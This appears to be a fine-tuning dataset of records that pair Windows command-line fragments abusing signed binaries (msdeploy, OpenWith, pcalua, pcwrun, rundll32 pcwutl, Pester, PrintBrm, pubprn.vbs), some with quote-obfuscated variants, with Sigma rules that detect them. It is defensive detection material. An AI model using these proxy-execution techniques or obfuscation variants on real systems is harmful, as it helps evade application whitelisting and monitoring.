{"instruction": "Write Sigma rule to detect payload:", "input": "verb:sync \\\"-source:RunCommand\\\" -dest:runCommand \\msdeploy.exe", "output": "title: Execute Files with Msdeploy.exe\nid: 646bc99f-6682-4b47-a73a-17b1b64c9d34\nstatus: test\ndescription: Detects file execution using the msdeploy.exe lolbin\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msdeploy/\n    - https://twitter.com/pabraeken/status/995837734379032576\n    - https://twitter.com/pabraeken/status/999090532839313408\nauthor: Beyu Denis, oscd.community\ndate: 2020-10-18\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'verb:sync'\n            - '-source:RunCommand'\n            - '-dest:runCommand'\n        Image|endswith: '\\msdeploy.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - System administrator Usage\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "verb:sync -source:RunCommand -dest:runCommand \\msdeploy", "output": "title: Execute Files with Msdeploy.exe\nid: 646bc99f-6682-4b47-a73a-17b1b64c9d34\nstatus: test\ndescription: Detects file execution using the msdeploy.exe lolbin\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msdeploy/\n    - https://twitter.com/pabraeken/status/995837734379032576\n    - https://twitter.com/pabraeken/status/999090532839313408\nauthor: Beyu Denis, oscd.community\ndate: 2020-10-18\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'verb:sync'\n            - '-source:RunCommand'\n            - '-dest:runCommand'\n        Image|endswith: '\\msdeploy.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - System administrator Usage\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "verb:sync \\msdeploy.exe -dest:runCommand -source:RunCommand", "output": "title: Execute Files with Msdeploy.exe\nid: 646bc99f-6682-4b47-a73a-17b1b64c9d34\nstatus: test\ndescription: Detects file execution using the msdeploy.exe lolbin\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msdeploy/\n    - https://twitter.com/pabraeken/status/995837734379032576\n    - https://twitter.com/pabraeken/status/999090532839313408\nauthor: Beyu Denis, oscd.community\ndate: 2020-10-18\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'verb:sync'\n            - '-source:RunCommand'\n            - '-dest:runCommand'\n        Image|endswith: '\\msdeploy.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - System administrator Usage\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\OpenWith.exe /c", "output": "title: OpenWith.exe Executes Specified Binary\nid: cec8e918-30f7-4e2d-9bfa-a59cc97ae60f\nstatus: test\ndescription: The OpenWith.exe executes other binary\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/4db780e0f0b2e2bb8cb1fa13e09196da9b9f1834/yml/LOLUtilz/OSBinaries/Openwith.yml\n    - https://twitter.com/harr0ey/status/991670870384021504\nauthor: Beyu Denis, oscd.community (rule), @harr0ey (idea)\ndate: 2019-10-12\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\OpenWith.exe'\n        CommandLine|contains: '/c'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\OpenWith.exe /\"c\"", "output": "title: OpenWith.exe Executes Specified Binary\nid: cec8e918-30f7-4e2d-9bfa-a59cc97ae60f\nstatus: test\ndescription: The OpenWith.exe executes other binary\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/4db780e0f0b2e2bb8cb1fa13e09196da9b9f1834/yml/LOLUtilz/OSBinaries/Openwith.yml\n    - https://twitter.com/harr0ey/status/991670870384021504\nauthor: Beyu Denis, oscd.community (rule), @harr0ey (idea)\ndate: 2019-10-12\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\OpenWith.exe'\n        CommandLine|contains: '/c'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\OpenWith /c", "output": "title: OpenWith.exe Executes Specified Binary\nid: cec8e918-30f7-4e2d-9bfa-a59cc97ae60f\nstatus: test\ndescription: The OpenWith.exe executes other binary\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/4db780e0f0b2e2bb8cb1fa13e09196da9b9f1834/yml/LOLUtilz/OSBinaries/Openwith.yml\n    - https://twitter.com/harr0ey/status/991670870384021504\nauthor: Beyu Denis, oscd.community (rule), @harr0ey (idea)\ndate: 2019-10-12\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\OpenWith.exe'\n        CommandLine|contains: '/c'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\OpenWith.exe /c", "output": "title: OpenWith.exe Executes Specified Binary\nid: cec8e918-30f7-4e2d-9bfa-a59cc97ae60f\nstatus: test\ndescription: The OpenWith.exe executes other binary\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/4db780e0f0b2e2bb8cb1fa13e09196da9b9f1834/yml/LOLUtilz/OSBinaries/Openwith.yml\n    - https://twitter.com/harr0ey/status/991670870384021504\nauthor: Beyu Denis, oscd.community (rule), @harr0ey (idea)\ndate: 2019-10-12\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\OpenWith.exe'\n        CommandLine|contains: '/c'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pcalua.exe -a", "output": "title: Use of Pcalua For Execution\nid: 0955e4e1-c281-4fb9-9ee1-5ee7b4b754d2\nrelated:\n    - id: fa47597e-90e9-41cd-ab72-c3b74cfb0d02\n      type: obsolete\nstatus: test\ndescription: Detects execition of commands and binaries from the context of The program compatibility assistant (Pcalua.exe). This can be used as a LOLBIN in order to bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Pcalua/\n    - https://pentestlab.blog/2020/07/06/indirect-command-execution/\nauthor: Nasreddine Bencherchali (Nextron Systems), E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2022-06-14\nmodified: 2023-01-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\pcalua.exe'\n        CommandLine|contains: ' -a' # No space after the flag because it accepts anything as long as there a \"-a\"\n    condition: selection\nfalsepositives:\n    - Legitimate use by a via a batch script or by an administrator.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pcalua.exe \\\"-\\\"\\\"a\\\"", "output": "title: Use of Pcalua For Execution\nid: 0955e4e1-c281-4fb9-9ee1-5ee7b4b754d2\nrelated:\n    - id: fa47597e-90e9-41cd-ab72-c3b74cfb0d02\n      type: obsolete\nstatus: test\ndescription: Detects execition of commands and binaries from the context of The program compatibility assistant (Pcalua.exe). This can be used as a LOLBIN in order to bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Pcalua/\n    - https://pentestlab.blog/2020/07/06/indirect-command-execution/\nauthor: Nasreddine Bencherchali (Nextron Systems), E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2022-06-14\nmodified: 2023-01-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\pcalua.exe'\n        CommandLine|contains: ' -a' # No space after the flag because it accepts anything as long as there a \"-a\"\n    condition: selection\nfalsepositives:\n    - Legitimate use by a via a batch script or by an administrator.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pcalua -a", "output": "title: Use of Pcalua For Execution\nid: 0955e4e1-c281-4fb9-9ee1-5ee7b4b754d2\nrelated:\n    - id: fa47597e-90e9-41cd-ab72-c3b74cfb0d02\n      type: obsolete\nstatus: test\ndescription: Detects execition of commands and binaries from the context of The program compatibility assistant (Pcalua.exe). This can be used as a LOLBIN in order to bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Pcalua/\n    - https://pentestlab.blog/2020/07/06/indirect-command-execution/\nauthor: Nasreddine Bencherchali (Nextron Systems), E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2022-06-14\nmodified: 2023-01-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\pcalua.exe'\n        CommandLine|contains: ' -a' # No space after the flag because it accepts anything as long as there a \"-a\"\n    condition: selection\nfalsepositives:\n    - Legitimate use by a via a batch script or by an administrator.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pcalua.exe -a", "output": "title: Use of Pcalua For Execution\nid: 0955e4e1-c281-4fb9-9ee1-5ee7b4b754d2\nrelated:\n    - id: fa47597e-90e9-41cd-ab72-c3b74cfb0d02\n      type: obsolete\nstatus: test\ndescription: Detects execition of commands and binaries from the context of The program compatibility assistant (Pcalua.exe). This can be used as a LOLBIN in order to bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Pcalua/\n    - https://pentestlab.blog/2020/07/06/indirect-command-execution/\nauthor: Nasreddine Bencherchali (Nextron Systems), E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2022-06-14\nmodified: 2023-01-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\pcalua.exe'\n        CommandLine|contains: ' -a' # No space after the flag because it accepts anything as long as there a \"-a\"\n    condition: selection\nfalsepositives:\n    - Legitimate use by a via a batch script or by an administrator.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pcwrun.exe ../", "output": "title: Indirect Command Execution By Program Compatibility Wizard\nid: b97cd4b1-30b8-4a9d-bd72-6293928d52bc\nstatus: test\ndescription: Detect indirect command execution via Program Compatibility Assistant pcwrun.exe\nreferences:\n    - https://twitter.com/pabraeken/status/991335019833708544\n    - https://lolbas-project.github.io/lolbas/Binaries/Pcwrun/\nauthor: A. Sungurov , oscd.community\ndate: 2020-10-12\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\pcwrun.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - ParentCommandLine\n    - CommandLine\nfalsepositives:\n    - Need to use extra processing with 'unique_count' / 'filter' to focus on outliers as opposed to commonly seen artifacts\n    - Legit usage of scripts\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\pcwrun.exe\\\" ../", "output": "title: Indirect Command Execution By Program Compatibility Wizard\nid: b97cd4b1-30b8-4a9d-bd72-6293928d52bc\nstatus: test\ndescription: Detect indirect command execution via Program Compatibility Assistant pcwrun.exe\nreferences:\n    - https://twitter.com/pabraeken/status/991335019833708544\n    - https://lolbas-project.github.io/lolbas/Binaries/Pcwrun/\nauthor: A. Sungurov , oscd.community\ndate: 2020-10-12\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\pcwrun.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - ParentCommandLine\n    - CommandLine\nfalsepositives:\n    - Need to use extra processing with 'unique_count' / 'filter' to focus on outliers as opposed to commonly seen artifacts\n    - Legit usage of scripts\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pcwrun ../", "output": "title: Indirect Command Execution By Program Compatibility Wizard\nid: b97cd4b1-30b8-4a9d-bd72-6293928d52bc\nstatus: test\ndescription: Detect indirect command execution via Program Compatibility Assistant pcwrun.exe\nreferences:\n    - https://twitter.com/pabraeken/status/991335019833708544\n    - https://lolbas-project.github.io/lolbas/Binaries/Pcwrun/\nauthor: A. Sungurov , oscd.community\ndate: 2020-10-12\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\pcwrun.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - ParentCommandLine\n    - CommandLine\nfalsepositives:\n    - Need to use extra processing with 'unique_count' / 'filter' to focus on outliers as opposed to commonly seen artifacts\n    - Legit usage of scripts\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pcwrun.exe ../", "output": "title: Indirect Command Execution By Program Compatibility Wizard\nid: b97cd4b1-30b8-4a9d-bd72-6293928d52bc\nstatus: test\ndescription: Detect indirect command execution via Program Compatibility Assistant pcwrun.exe\nreferences:\n    - https://twitter.com/pabraeken/status/991335019833708544\n    - https://lolbas-project.github.io/lolbas/Binaries/Pcwrun/\nauthor: A. Sungurov , oscd.community\ndate: 2020-10-12\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\pcwrun.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - ParentCommandLine\n    - CommandLine\nfalsepositives:\n    - Need to use extra processing with 'unique_count' / 'filter' to focus on outliers as opposed to commonly seen artifacts\n    - Legit usage of scripts\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE pcwutl LaunchApplication", "output": "title: Code Execution via Pcwutl.dll\nid: 9386d78a-7207-4048-9c9f-a93a7c2d1c05\nstatus: test\ndescription: Detects launch of executable by calling the LaunchApplication function from pcwutl.dll library.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Pcwutl/\n    - https://twitter.com/harr0ey/status/989617817849876488\nauthor: Julia Fomina, oscd.community\ndate: 2020-10-05\nmodified: 2023-02-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'pcwutl'\n            - 'LaunchApplication'\n    condition: all of selection_*\nfalsepositives:\n    - Use of Program Compatibility Troubleshooter Helper\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE \\\"pcwutl\\\" LaunchApplication", "output": "title: Code Execution via Pcwutl.dll\nid: 9386d78a-7207-4048-9c9f-a93a7c2d1c05\nstatus: test\ndescription: Detects launch of executable by calling the LaunchApplication function from pcwutl.dll library.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Pcwutl/\n    - https://twitter.com/harr0ey/status/989617817849876488\nauthor: Julia Fomina, oscd.community\ndate: 2020-10-05\nmodified: 2023-02-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'pcwutl'\n            - 'LaunchApplication'\n    condition: all of selection_*\nfalsepositives:\n    - Use of Program Compatibility Troubleshooter Helper\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32 RUNDLL32 pcwutl LaunchApplication", "output": "title: Code Execution via Pcwutl.dll\nid: 9386d78a-7207-4048-9c9f-a93a7c2d1c05\nstatus: test\ndescription: Detects launch of executable by calling the LaunchApplication function from pcwutl.dll library.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Pcwutl/\n    - https://twitter.com/harr0ey/status/989617817849876488\nauthor: Julia Fomina, oscd.community\ndate: 2020-10-05\nmodified: 2023-02-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'pcwutl'\n            - 'LaunchApplication'\n    condition: all of selection_*\nfalsepositives:\n    - Use of Program Compatibility Troubleshooter Helper\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe pcwutl RUNDLL32.EXE LaunchApplication", "output": "title: Code Execution via Pcwutl.dll\nid: 9386d78a-7207-4048-9c9f-a93a7c2d1c05\nstatus: test\ndescription: Detects launch of executable by calling the LaunchApplication function from pcwutl.dll library.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Pcwutl/\n    - https://twitter.com/harr0ey/status/989617817849876488\nauthor: Julia Fomina, oscd.community\ndate: 2020-10-05\nmodified: 2023-02-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'pcwutl'\n            - 'LaunchApplication'\n    condition: all of selection_*\nfalsepositives:\n    - Use of Program Compatibility Troubleshooter Helper\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe Pester Get-Help \\cmd.exe pester ; help \\?", "output": "title: Execute Code with Pester.bat as Parent\nid: 18988e1b-9087-4f8a-82fe-0414dce49878\nrelated:\n    - id: 59e938ff-0d6d-4dc3-b13f-36cc28734d4e\n      type: similar\nstatus: test\ndescription: Detects code execution via Pester.bat (Pester - Powershell Modulte for testing)\nreferences:\n    - https://twitter.com/Oddvarmoe/status/993383596244258816\n    - https://twitter.com/_st0pp3r_/status/1560072680887525378\nauthor: frack113, Nasreddine Bencherchali\ndate: 2022-08-20\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_module:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        ParentCommandLine|contains: '\\WindowsPowerShell\\Modules\\Pester\\'\n    selection_cli:\n        ParentCommandLine|contains:\n            - '{ Invoke-Pester -EnableExit ;'\n            - '{ Get-Help \"'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of Pester for writing tests for Powershell scripts and modules\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\\"p\"\"w\"\"s\"\"h\"\".\"\"e\"\"x\"\"e\" Pester Get-Help \\cmd.exe pester ; help \\?", "output": "title: Execute Code with Pester.bat as Parent\nid: 18988e1b-9087-4f8a-82fe-0414dce49878\nrelated:\n    - id: 59e938ff-0d6d-4dc3-b13f-36cc28734d4e\n      type: similar\nstatus: test\ndescription: Detects code execution via Pester.bat (Pester - Powershell Modulte for testing)\nreferences:\n    - https://twitter.com/Oddvarmoe/status/993383596244258816\n    - https://twitter.com/_st0pp3r_/status/1560072680887525378\nauthor: frack113, Nasreddine Bencherchali\ndate: 2022-08-20\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_module:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        ParentCommandLine|contains: '\\WindowsPowerShell\\Modules\\Pester\\'\n    selection_cli:\n        ParentCommandLine|contains:\n            - '{ Invoke-Pester -EnableExit ;'\n            - '{ Get-Help \"'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of Pester for writing tests for Powershell scripts and modules\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell \\pwsh Pester Get-Help \\cmd pester ; help \\?", "output": "title: Execute Code with Pester.bat as Parent\nid: 18988e1b-9087-4f8a-82fe-0414dce49878\nrelated:\n    - id: 59e938ff-0d6d-4dc3-b13f-36cc28734d4e\n      type: similar\nstatus: test\ndescription: Detects code execution via Pester.bat (Pester - Powershell Modulte for testing)\nreferences:\n    - https://twitter.com/Oddvarmoe/status/993383596244258816\n    - https://twitter.com/_st0pp3r_/status/1560072680887525378\nauthor: frack113, Nasreddine Bencherchali\ndate: 2022-08-20\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_module:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        ParentCommandLine|contains: '\\WindowsPowerShell\\Modules\\Pester\\'\n    selection_cli:\n        ParentCommandLine|contains:\n            - '{ Invoke-Pester -EnableExit ;'\n            - '{ Get-Help \"'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of Pester for writing tests for Powershell scripts and modules\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe Pester Get-Help \\cmd.exe pester ; help \\?", "output": "title: Execute Code with Pester.bat as Parent\nid: 18988e1b-9087-4f8a-82fe-0414dce49878\nrelated:\n    - id: 59e938ff-0d6d-4dc3-b13f-36cc28734d4e\n      type: similar\nstatus: test\ndescription: Detects code execution via Pester.bat (Pester - Powershell Modulte for testing)\nreferences:\n    - https://twitter.com/Oddvarmoe/status/993383596244258816\n    - https://twitter.com/_st0pp3r_/status/1560072680887525378\nauthor: frack113, Nasreddine Bencherchali\ndate: 2022-08-20\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_module:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        ParentCommandLine|contains: '\\WindowsPowerShell\\Modules\\Pester\\'\n    selection_cli:\n        ParentCommandLine|contains:\n            - '{ Invoke-Pester -EnableExit ;'\n            - '{ Get-Help \"'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of Pester for writing tests for Powershell scripts and modules\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\PrintBrm.exe -f .zip", "output": "title: PrintBrm ZIP Creation of Extraction\nid: cafeeba3-01da-4ab4-b6c4-a31b1d9730c7\nstatus: test\ndescription: Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/PrintBrm/\nauthor: frack113\ndate: 2022-05-02\ntags:\n    - attack.command-and-control\n    - attack.t1105\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\PrintBrm.exe'\n        CommandLine|contains|all:\n            - ' -f'\n            - '.zip'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\PrintBrm.exe\\\" -f .zip", "output": "title: PrintBrm ZIP Creation of Extraction\nid: cafeeba3-01da-4ab4-b6c4-a31b1d9730c7\nstatus: test\ndescription: Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/PrintBrm/\nauthor: frack113\ndate: 2022-05-02\ntags:\n    - attack.command-and-control\n    - attack.t1105\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\PrintBrm.exe'\n        CommandLine|contains|all:\n            - ' -f'\n            - '.zip'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\PrintBrm -f .zip", "output": "title: PrintBrm ZIP Creation of Extraction\nid: cafeeba3-01da-4ab4-b6c4-a31b1d9730c7\nstatus: test\ndescription: Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/PrintBrm/\nauthor: frack113\ndate: 2022-05-02\ntags:\n    - attack.command-and-control\n    - attack.t1105\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\PrintBrm.exe'\n        CommandLine|contains|all:\n            - ' -f'\n            - '.zip'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\PrintBrm.exe -f .zip", "output": "title: PrintBrm ZIP Creation of Extraction\nid: cafeeba3-01da-4ab4-b6c4-a31b1d9730c7\nstatus: test\ndescription: Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/PrintBrm/\nauthor: frack113\ndate: 2022-05-02\ntags:\n    - attack.command-and-control\n    - attack.t1105\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\PrintBrm.exe'\n        CommandLine|contains|all:\n            - ' -f'\n            - '.zip'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pubprn.vbs script:", "output": "title: Pubprn.vbs Proxy Execution\nid: 1fb76ab8-fa60-4b01-bddd-71e89bf555da\nstatus: test\ndescription: Detects the use of the 'Pubprn.vbs' Microsoft signed script to execute commands.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/Pubprn/\nauthor: frack113\ndate: 2022-05-28\ntags:\n    - attack.defense-evasion\n    - attack.t1216.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\pubprn.vbs'\n            - 'script:'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"p\"\"u\"\"b\"\"p\"\"r\"\"n\"\".\"\"v\"\"b\"\"s\" script:", "output": "title: Pubprn.vbs Proxy Execution\nid: 1fb76ab8-fa60-4b01-bddd-71e89bf555da\nstatus: test\ndescription: Detects the use of the 'Pubprn.vbs' Microsoft signed script to execute commands.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/Pubprn/\nauthor: frack113\ndate: 2022-05-28\ntags:\n    - attack.defense-evasion\n    - attack.t1216.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\pubprn.vbs'\n            - 'script:'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pubprn script:", "output": "title: Pubprn.vbs Proxy Execution\nid: 1fb76ab8-fa60-4b01-bddd-71e89bf555da\nstatus: test\ndescription: Detects the use of the 'Pubprn.vbs' Microsoft signed script to execute commands.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/Pubprn/\nauthor: frack113\ndate: 2022-05-28\ntags:\n    - attack.defense-evasion\n    - attack.t1216.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\pubprn.vbs'\n            - 'script:'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pubprn.vbs script:", "output": "title: Pubprn.vbs Proxy Execution\nid: 1fb76ab8-fa60-4b01-bddd-71e89bf555da\nstatus: test\ndescription: Detects the use of the 'Pubprn.vbs' Microsoft signed script to execute commands.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/Pubprn/\nauthor: frack113\ndate: 2022-05-28\ntags:\n    - attack.defense-evasion\n    - attack.t1216.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\pubprn.vbs'\n            - 'script:'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
